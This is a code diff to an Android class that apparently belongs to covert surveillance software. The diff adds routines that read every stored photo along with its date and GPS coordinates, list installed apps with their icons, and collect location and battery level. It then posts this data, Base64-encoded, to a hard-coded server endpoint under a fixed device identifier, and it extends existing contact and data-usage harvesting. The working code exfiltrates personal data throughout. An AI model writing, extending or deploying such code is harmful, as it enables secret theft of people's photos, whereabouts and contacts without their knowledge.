@@ -1,6 +1,5 @@
 package src.silent.jobs.tasks;
 
-import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.Context;
@@ -12,13 +11,15 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.drawable.BitmapDrawable;
+import android.graphics.drawable.Drawable;
+import android.graphics.drawable.LayerDrawable;
+import android.graphics.drawable.VectorDrawable;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.TrafficStats;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.os.BatteryManager;
 import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -30,13 +31,16 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStream;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
 
+import src.silent.utils.BatteryHandler;
 import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.LocationHandler;
 import src.silent.utils.SHA1Helper;
@@ -65,7 +69,16 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getSmartphoneLocation(bulkData, hashes[i]);
+                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI);
+                        ServerCommunicationHandler.executeDataPost(params[0],
+                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                "357336064017681");
+                        bulkData = new JSONObject();
+                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+                        ServerCommunicationHandler.executeDataPost(params[0],
+                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                "357336064017681");
+                        bulkData = new JSONObject();
                         break;
                     case 1:
                         getContacts(bulkData, hashes[i]);
@@ -78,6 +91,16 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         break;
                     case 4:
                         getMobileDataUsage(bulkData, hashes[i]);
+                        break;
+                    case 5:
+                        getInstalledApps(bulkData, hashes[i]);
+                        break;
+                    case 6:
+                        getSmartphoneLocation(bulkData, hashes[i]);
+                        break;
+                    case 7:
+                        getBatteryLevel(bulkData);
+                        break;
                 }
             }
         }
@@ -398,68 +421,150 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
 
     }
 
-    private void getInstalledApps(JSONObject bulkData) {
-        PackageManager pm = params.getPackageManager();
-        List<ApplicationInfo> packages = pm.getInstalledApplications(0);
-        for (ApplicationInfo packageInfo : packages) {
-            String package_name = packageInfo.packageName;
-            ApplicationInfo app = null;
-            try {
-                app = pm.getApplicationInfo(package_name, 0);
-            } catch (PackageManager.NameNotFoundException e) {
-                e.printStackTrace();
+    private void getInstalledApps(JSONObject bulkData, String hash) {
+        try {
+            PackageManager pm = params.getPackageManager();
+            List<ApplicationInfo> packages = pm.getInstalledApplications(0);
+
+            JSONObject applications = new JSONObject();
+            JSONArray informationArray = new JSONArray();
+            long newHash = 0;
+            for (ApplicationInfo packageInfo : packages) {
+                String package_name = packageInfo.packageName;
+                long appDate = pm.getPackageInfo(package_name, 0).firstInstallTime;
+                if (appDate > Long.parseLong(hash)) {
+                    JSONObject information = new JSONObject();
+
+                    ApplicationInfo app = pm.getApplicationInfo(package_name, 0);
+                    information.put("Name", Base64.encodeToString(((String) pm
+                            .getApplicationLabel(app)).getBytes(), Base64.URL_SAFE));
+                    Drawable drIcon = pm.getApplicationIcon(app);
+                    Bitmap icon = null;
+                    if (drIcon.getClass() != LayerDrawable.class &&
+                            drIcon.getClass() != VectorDrawable.class) {
+                        icon = ((BitmapDrawable) drIcon).getBitmap();
+                    }
+                    information.put("Icon", BitmapJsonHelper.getStringFromBitmap(icon));
+                    informationArray.put(information);
+
+                    if (appDate > newHash) {
+                        newHash = appDate;
+                    }
+                }
             }
-            String name = (String) pm.getApplicationLabel(app);
-            Bitmap icon = ((BitmapDrawable)pm.getApplicationIcon(app)).getBitmap();
+
+            if (informationArray.length() != 0) {
+                applications.put("Applications", informationArray);
+                applications.put("Hash", newHash);
+                bulkData.put("Applications", applications);
+            }
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
         }
     }
 
-    private void getPhotosVideos(JSONObject bulkData) {
-        ContentResolver cr = params.getContentResolver();
-        String[] filePathColumn = {MediaStore.Images.Media.DATA};
-        Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, filePathColumn
-                , null, null, null);
-        if (cur.moveToFirst()) {
-            do {
-                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
-                String picturePath = cur.getString(columnIndex);
-                if (picturePath != null) {
-                    File file = new File(picturePath);
+    private void getPhotos(JSONObject bulkData, String hash, Uri uri) {
+        try {
+            JSONObject photos = new JSONObject();
+            JSONArray informationArray = new JSONArray();
 
-                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
-                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
-                }
-            } while (cur.moveToNext());
-        }
-        cur.close();
+            ContentResolver cr = params.getContentResolver();
+            String[] filePathColumn = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN,
+                    MediaStore.Images.Media.LATITUDE, MediaStore.Images.Media.LONGITUDE};
+            String selection = null;
+            String[] selectionArgs = null;
+            String newHash = hash;
+            boolean first = true;
+            if (!hash.equals("0")) {
+                selection = "datetaken>?";
+                selectionArgs = new String[]{hash};
+            }
+            Cursor cur = cr.query(uri, filePathColumn
+                    , selection, selectionArgs, "datetaken DESC");
 
-        cur = cr.query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, filePathColumn
-                , null, null, null);
-        if (cur.moveToFirst()) {
-            do {
-                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
-                String picturePath = cur.getString(columnIndex);
-                if (picturePath != null) {
-                    File file = new File(picturePath);
-                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
-                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
-                }
-            } while (cur.moveToFirst());
+            if (cur.moveToFirst()) {
+                do {
+                    int columnIndex = cur.getColumnIndex(filePathColumn[0]);
+                    String picturePath = cur.getString(columnIndex);
+                    if (picturePath != null) {
+                        int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
+                        int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
+                        int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
+                        Timestamp datetaken = new Timestamp(Long
+                                .parseLong(cur.getString(dateTakenIndex)));
+                        if (first) {
+                            first = false;
+                            newHash = cur.getString(dateTakenIndex);
+                        }
+                        String longitude = cur.getString(longitudeIndex);
+                        String latitude = cur.getString(latitudeIndex);
+
+                        JSONObject information = new JSONObject();
+                        File file = new File(picturePath);
+                        InputStream inputStream = new FileInputStream(file);
+                        byte[] array = readBytes(inputStream);
+
+                        information.put("Image", Base64.encodeToString(array, Base64.URL_SAFE));
+                        information.put("Date", Base64.encodeToString(datetaken
+                                .toString().getBytes(), Base64.URL_SAFE));
+                        if (longitude == null) {
+                            information.put("Longitude", "");
+                        } else {
+                            information.put("Longitude", Base64.encodeToString(longitude
+                                    .getBytes(), Base64.URL_SAFE));
+                        }
+
+                        if (latitude == null) {
+                            information.put("Latitude", "");
+                        } else {
+                            information.put("Latitude", Base64.encodeToString(latitude.getBytes(),
+                                    Base64.URL_SAFE));
+                        }
+
+                        informationArray.put(information);
+                    }
+                } while (cur.moveToNext());
+            }
+            cur.close();
+
+            if (informationArray.length() != 0) {
+                photos.put("Photos", informationArray);
+                photos.put("Hash", newHash);
+                bulkData.put("Photos", photos);
+            }
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
         }
-        cur.close();
+    }
+
+    private byte[] readBytes(InputStream inputStream) throws Exception {
+        // this dynamically extends to take the bytes you read
+        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
+
+        // this is storage overwritten on each iteration with bytes
+        int bufferSize = 1024;
+        byte[] buffer = new byte[bufferSize];
+
+        // we need to know how may bytes were read to write them to the byteBuffer
+        int len = 0;
+        while ((len = inputStream.read(buffer)) != -1) {
+            byteBuffer.write(buffer, 0, len);
+            Log.d("Size", "" + len);
+        }
+
+        // and then we can return your byte array.
+        return byteBuffer.toByteArray();
     }
 
     private void getBatteryLevel(JSONObject bulkData) {
-        BroadcastReceiver batteryReceriver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                float batteryPct = level / (float) scale;
-                Log.d("BETTERY", "" + batteryPct);
-            }
-        };
-        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        params.registerReceiver(batteryReceriver, batteryFilter);
+        try {
+            BatteryHandler batteryReceriver = new BatteryHandler();
+            IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            params.registerReceiver(batteryReceriver, batteryFilter);
+
+            bulkData.put("BatteryLevel", batteryReceriver.getBatteryLevel());
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
+        }
     }
 }
